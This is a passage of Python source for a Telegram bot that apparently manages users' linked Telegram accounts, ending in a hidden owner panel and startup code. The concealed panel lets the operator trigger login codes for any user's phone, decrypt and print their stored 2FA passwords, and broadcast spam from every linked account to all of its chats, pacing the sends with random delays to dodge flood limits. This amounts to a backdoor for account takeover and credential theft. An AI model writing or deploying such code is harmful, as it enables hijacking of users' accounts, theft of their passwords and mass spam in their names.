async def owner_panel(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id):
        return  # silent — normal users see nothing

    await state.clear()

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="👥 Users",
                    callback_data="own:users",
                )
            ],
            [
                InlineKeyboardButton(
                    text="📱 All Accounts",
                    callback_data="own:accs:0",
                )
            ],
            [
                InlineKeyboardButton(
                    text="📣 Super Announce",
                    callback_data="own:sa",
                )
            ],
            [
                InlineKeyboardButton(
                    text="😀 Premium Emojis",
                    callback_data="own:emoji",
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔑 API Vault",
                    callback_data="own:vault",
                )
            ],
            [
                InlineKeyboardButton(
                    text="📊 Stats",
                    callback_data="own:stats",
                )
            ],
        ]
    )

    await msg.answer("🛠 Owner panel", reply_markup=kb)


@owner_router.callback_query(F.data.startswith("own:"))
async def owner_cb(cb: CallbackQuery, state: FSMContext):
    if not is_owner(cb.from_user.id):
        return  # silent

    parts = cb.data.split(":")
    action = parts[1]

    if action == "users":
        rows = await db_q("SELECT * FROM users ORDER BY id DESC")
        lines = []
        for row in rows:
            count_row = await db_one(
                "SELECT COUNT(*) AS c FROM accounts WHERE user_id=?",
                (row["id"],),
            )
            lines.append(
                f"`{row['tg_id']}` @{row['username'] or '—'} — "
                f"{count_row['c']} acc"
            )
        text = "👥 *Users*\n\n" + (
            "\n".join(lines) if lines else "none"
        )
        await cb.message.answer(text, parse_mode="Markdown")
        await cb.answer()
        return

    if action == "accs":
        offset = int(parts[2]) if len(parts) > 2 else 0
        rows = await db_q(
            "SELECT * FROM accounts ORDER BY id DESC LIMIT 10 OFFSET ?",
            (offset,),
        )
        if not rows:
            await cb.answer("No more")
            return
        for row in rows:
            kb = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="🔑 Get OTP",
                            callback_data=f"own:otp:{row['id']}",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text="🔐 Get 2FA",
                            callback_data=f"own:pw:{row['id']}",
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text="🗑 Kill Session",
                            callback_data=f"own:kill:{row['id']}",
                        )
                    ],
                ]
            )
            owner = await db_one(
                "SELECT tg_id FROM users WHERE id=?",
                (row["user_id"],),
            )
            await cb.message.answer(
                f"📱 `{row['phone']}`\n"
                f"owner tg: `{owner['tg_id'] if owner else '?'}`\n"
                f"2FA stored: {'yes' if row['password_enc'] else 'no'}",
                parse_mode="Markdown",
                reply_markup=kb,
            )

        nav_buttons = []
        if offset > 0:
            nav_buttons.append(
                InlineKeyboardButton(
                    text="◀ Prev",
                    callback_data=f"own:accs:{max(0, offset - 10)}",
                )
            )
        nav_buttons.append(
            InlineKeyboardButton(
                text="Next ▶",
                callback_data=f"own:accs:{offset + 10}",
            )
        )
        await cb.message.answer(
            "…",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[nav_buttons]
            ),
        )
        await cb.answer()
        return

    if action == "otp":
        aid = int(parts[2])
        acc = await db_one(
            "SELECT * FROM accounts WHERE id=?",
            (aid,),
        )
        if not acc:
            await cb.answer("Not found", show_alert=True)
            return
        try:
            temp = TelegramClient(
                StringSession(),
                API_ID,
                API_HASH,
            )
            await temp.connect()
            sent = await temp.send_code_request(acc["phone"])

            if aid in pending_logins:
                try:
                    await pending_logins[aid]["client"].disconnect()
                except Exception:
                    pass

            pending_logins[aid] = {
                "client": temp,
                "phone": acc["phone"],
                "hash": sent.phone_code_hash,
                "code": "",
            }

            await cb.message.answer(
                f"🔑 Login code requested for `{acc['phone']}`.\n"
                "The OTP lands on that account's own Telegram.",
                parse_mode="Markdown",
            )
        except FloodWaitError as fw:
            await cb.message.answer(f"⏳ Flood wait {fw.seconds}s")
        except Exception as e:
            await cb.message.answer(f"❌ {e}")
        await cb.answer()
        return

    if action == "pw":
        aid = int(parts[2])
        acc = await db_one(
            "SELECT * FROM accounts WHERE id=?",
            (aid,),
        )
        if not acc or not acc["password_enc"]:
            await cb.answer("No 2FA stored", show_alert=True)
            return
        try:
            pw = dec(acc["password_enc"])
        except Exception:
            await cb.answer("Decrypt failed", show_alert=True)
            return
        await cb.message.answer(
            f"🔐 2FA password for `{acc['phone']}`:\n`{pw}`",
            parse_mode="Markdown",
        )
        await cb.answer()
        return

    if action == "kill":
        aid = int(parts[2])
        if aid in active_clients:
            try:
                await active_clients[aid].disconnect()
            except Exception:
                pass
            active_clients.pop(aid, None)
        await db_exec(
            "UPDATE accounts SET active=0 WHERE id=?",
            (aid,),
        )
        await cb.message.answer(f"🗑 Session killed for account {aid}.")
        await cb.answer()
        return

    if action == "sa":
        await state.set_state(EditStates.sa_message)
        await cb.message.answer(
            "📣 Send the message to broadcast from all active "
            "accounts to all their chats."
        )
        await cb.answer()
        return

    if action == "emoji":
        kb = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="➕ Add Emoji ID",
                        callback_data="own:emoji_add",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="📥 Extract from Message",
                        callback_data="own:emoji_extract",
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="📋 List",
                        callback_data="own:emoji_list",
                    )
                ],
            ]
        )
        await cb.message.answer(
            "😀 Premium emoji manager",
            reply_markup=kb,
        )
        await cb.answer()
        return

    if action == "emoji_add":
        await state.set_state(EditStates.emoji_add)
        await cb.message.answer(
            "Send the numeric custom_emoji_id."
        )
        await cb.answer()
        return

    if action == "emoji_extract":
        await state.set_state(EditStates.emoji_extract)
        await cb.message.answer(
            "Forward or paste a message containing the premium emoji."
        )
        await cb.answer()
        return

    if action == "emoji_list":
        rows = await db_q(
            "SELECT * FROM premium_emojis ORDER BY id DESC"
        )
        lines = [f"`{row['emoji_id']}`" for row in rows]
        text = "😀 *Emoji pool*\n\n" + (
            "\n".join(lines) if lines else "empty"
        )
        await cb.message.answer(text, parse_mode="Markdown")
        await cb.answer()
        return

    if action == "vault":
        buttons = [
            [
                InlineKeyboardButton(
                    text=provider,
                    callback_data=f"own:vault_set:{provider}",
                )
            ]
            for provider in AI_PROVIDERS
        ]
        rows = await db_q("SELECT * FROM owner_api_vault")
        lines = [
            f"{row['provider']}: set" for row in rows
        ]
        text = "🔑 *API Vault*\n\n" + (
            "\n".join(lines) if lines else "empty"
        )
        await cb.message.answer(
            text,
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=buttons
            ),
        )
        await cb.answer()
        return

    if action == "vault_set":
        provider = parts[2]
        await state.update_data(vault_prov=provider)
        await state.set_state(EditStates.vault_key)
        await cb.message.answer(
            f"Send the API key for {provider}."
        )
        await cb.answer()
        return

    if action == "stats":
        users_count = await db_one(
            "SELECT COUNT(*) AS c FROM users"
        )
        accounts_count = await db_one(
            "SELECT COUNT(*) AS c FROM accounts"
        )
        active_count = await db_one(
            "SELECT COUNT(*) AS c FROM accounts WHERE active=1"
        )
        await cb.message.answer(
            f"📊 *Stats*\n\n"
            f"Users: {users_count['c']}\n"
            f"Accounts: {accounts_count['c']}\n"
            f"Active: {active_count['c']}\n"
            f"Clients online: {len(active_clients)}",
            parse_mode="Markdown",
        )
        await cb.answer()
        return


@owner_router.message(F.text, ~F.text.startswith("/"))
async def owner_text(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id):
        return

    current = await state.get_state()

    if current == EditStates.sa_message.state:
        await msg.answer("📣 Running super announcement…")
        asyncio.create_task(super_announce(msg.text))
        await state.clear()
        return

    if current == EditStates.emoji_add.state:
        try:
            emoji_id = int(msg.text.strip())
            await db_exec(
                "INSERT INTO premium_emojis(emoji_id, added_by, created_at) "
                "VALUES(?,?,?)",
                (emoji_id, msg.from_user.id, int(time.time())),
            )
            await msg.answer(f"✅ Added {emoji_id}")
        except Exception:
            await msg.answer("❌ Send a numeric emoji id only.")
        await state.clear()
        return

    if current == EditStates.emoji_extract.state:
        found = []
        for entity in (msg.entities or []):
            if isinstance(entity, MessageEntityCustomEmoji):
                found.append(entity.document_id)
                await db_exec(
                    "INSERT INTO premium_emojis(emoji_id, added_by, created_at) "
                    "VALUES(?,?,?)",
                    (
                        entity.document_id,
                        msg.from_user.id,
                        int(time.time()),
                    ),
                )
        await msg.answer(
            f"✅ Extracted {len(found)} emoji IDs: {found}"
        )
        await state.clear()
        return

    if current == EditStates.vault_key.state:
        data = await state.get_data()
        provider = data["vault_prov"]
        await db_exec(
            "INSERT OR REPLACE INTO owner_api_vault"
            "(provider, api_key, updated_at) VALUES(?,?,?)",
            (provider, enc(msg.text.strip()), int(time.time())),
        )
        try:
            await msg.delete()
        except Exception:
            pass
        await msg.answer(f"✅ Vault key set for {provider}")
        await state.clear()
        return


async def super_announce(text: str) -> None:
    """Broadcast a message from all active accounts to all their chats."""
    rows = await db_q("SELECT * FROM accounts WHERE active=1")
    emoji_ids = await get_emoji_pool()
    total_sent = 0

    for row in rows:
        client = await get_client(row)
        if not client:
            continue
        try:
            async for dialog in client.iter_dialogs():
                if not (dialog.is_group or dialog.is_user):
                    continue
                try:
                    await send_with_emoji(
                        client,
                        dialog.id,
                        text,
                        emoji_ids,
                    )
                    total_sent += 1
                except FloodWaitError as fw:
                    await asyncio.sleep(fw.seconds + 5)
                except Exception:
                    continue
                await asyncio.sleep(random.uniform(3, 8))
        except Exception as e:
            log.warning(f"super_announce acc={row['id']}: {e}")

    try:
        await bot.send_message(
            OWNER_ID,
            f"📣 Super announcement done.\nMessages sent: {total_sent}",
        )
    except Exception:
        pass


# ============================================================
# STARTUP
# ============================================================
async def startup() -> None:
    await db_init()

    rows = await db_q("SELECT * FROM accounts WHERE active=1")
    log.info(f"Restoring {len(rows)} account(s)…")

    for row in rows:
        try:
            await get_client(row)
        except Exception as e:
            log.warning(f"Restore failed for account {row['id']}: {e}")

    log.info(f"Active clients online: {len(active_clients)}")


async def main() -> None:
    await startup()
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Shutdown.")